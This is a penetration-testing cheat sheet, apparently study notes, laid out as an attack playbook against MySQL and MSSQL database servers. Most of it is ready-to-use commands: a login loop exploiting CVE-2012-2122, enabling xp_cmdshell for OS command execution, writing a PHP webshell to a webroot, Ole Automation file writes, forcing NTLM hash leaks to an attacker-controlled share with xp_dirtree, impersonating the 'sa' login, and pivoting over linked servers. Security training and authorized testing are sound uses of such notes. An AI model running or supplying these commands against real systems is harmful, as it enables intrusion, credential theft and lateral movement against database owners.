## Initial Enumeration

Symptom: Identifying database services on standard or non-standard ports. MSSQL defaults to **TCP/1433** and **UDP/1434**, or **TCP/2433** when hidden; MySQL defaults to **TCP/3306**.

Banner grabbing and script-based enumeration:

```
nmap -Pn -sV -sC -p<PORT> <TARGET_IP>
```

**Dangerous / misconfigured settings**

- MSSQL running in **hidden mode** on **TCP/2433**.
- **Anonymous access** enabled or users configured with **no password**.

## Connecting to SQL Services

Symptom: Valid credentials obtained for a target database service.

Connect to MySQL/MariaDB:

```
mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP>
```

Connect to MSSQL via sqlcmd with adjusted output width:

```
sqlcmd -S <TARGET_IP> -U <USERNAME> -P '<PASSWORD>' -y 30 -Y 30
```

Connect to MSSQL via sqsh with Windows Authentication:

```
sqsh -S <TARGET_IP> -U <DOMAIN>\<USERNAME> -P '<PASSWORD>' -h
```

**Tool comparison**

- sqlcmd -> `sqlcmd -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>` -> native Windows CLI; use `-y/-Y` for output formatting.
- sqsh -> `sqsh -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>` -> Linux-based; use `-h` to disable headers for clean output.

**Gotchas**

- **Authentication failure** occurs if the domain/hostname is omitted when attempting **Windows Authentication**; it defaults to SQL Authentication.

## MySQL Authentication Bypass

Symptom: Targeting MySQL 5.6.x or similar where a **timing attack** vulnerability (CVE-2012-2122) exists.

Bypass login by repeatedly sending an incorrect password until the server fails to validate correctly:

```
for i in {1..1000}; do mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP> -e "status" 2>/dev/null && break; done
```

**Gotchas**

- **Bypass failure** if the specific race condition/timing vulnerability is not present in the target version.

## Database and Table Enumeration

Symptom: Initial access established; need to locate **PII**, **credentials**, or **configuration** data.

List MySQL databases:

```
SHOW DATABASES;
```

List MSSQL databases:

```
SELECT name FROM master.dbo.sysdatabases;
GO
```

List MySQL tables in a specific database:

```
USE <SERVICE_NAME>;
SHOW TABLES;
```

List MSSQL tables using INFORMATION_SCHEMA:

```
SELECT table_name FROM <SERVICE_NAME>.INFORMATION_SCHEMA.TABLES;
GO
```

**Gotchas**

- **Permission denied** error occurs when attempting to list or connect to a database without sufficient user privileges.

## RCE via MSSQL xp_cmdshell

Symptom: **sysadmin** privileges (or equivalent) held on MSSQL; need OS-level command execution.

Enable advanced options and xp_cmdshell:

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
```

Execute OS commands:

```
xp_cmdshell '<COMMAND>';
GO
```

> ⚠️ Gap: Command execution will fail if the MSSQL service account lacks permissions to execute `cmd.exe` or if EDR blocks the spawned process.

## RCE via MySQL File Write

Symptom: MySQL **FILE** privilege held and **secure_file_priv** is disabled/empty; targeting a web server directory.

Check secure_file_priv status:

```
show variables like "secure_file_priv";
```

Write a PHP webshell to the webroot:

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '<FILE_PATH>';
```

**Dangerous / misconfigured settings**

- **secure_file_priv** set to empty, allowing unrestricted read/write access via SQL.

## RCE via MSSQL Ole Automation

Symptom: Admin privileges held on MSSQL; **xp_cmdshell** is restricted or monitored, but file write is possible.

Enable Ole Automation Procedures:

```
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
GO
```

Write a file to the filesystem:

```
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<FILE_PATH>', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<DATA>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
GO
```

## MSSQL Hash Stealing

Symptom: Need to capture the MSSQL **service account hash** for offline cracking or NTLM relay.

Trigger NTLM authentication via xp_dirtree:

```
EXEC master..xp_dirtree '\<ATTACK_IP>\<SHARE_NAME>';
GO
```

Trigger NTLM authentication via xp_subdirs:

```
EXEC master..xp_subdirs '\<ATTACK_IP>\<SHARE_NAME>';
GO
```

**Tool comparison**

- Responder -> `sudo responder -I <INTERFACE>` -> use for capturing and analyzing hashes.
- impacket-smbserver -> `sudo impacket-smbserver <SHARE_NAME> ./ -smb2support` -> use for capturing hashes when a simple SMB listener is sufficient.

## MSSQL Context Impersonation

Symptom: Current user is not a **sysadmin**, but has **IMPERSONATE** permissions on a high-privileged user.

Identify users available for impersonation:

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
GO
```

Impersonate the 'sa' user:

```
EXECUTE AS LOGIN = 'sa';
GO
```

**Edge cases**

- Use `USE master` before impersonating; the target user may lack access to the current database, causing an **authentication error**.

## MSSQL Linked Servers

Symptom: Current MSSQL instance has **linked servers** configured, potentially allowing lateral movement.

Identify linked/remote servers:

```
SELECT srvname, isremote FROM sysservers;
GO
```

Execute commands on the linked server as **sysadmin** (if configured with high-priv credentials):

```
EXECUTE('<COMMAND>') AT [<PIVOT_IP>\<SERVICE_NAME>];
GO
```

**Gotchas**

- **Syntax error** occurs if single quotes are not escaped using double single quotes (`''`) when passing commands through the `EXECUTE` statement.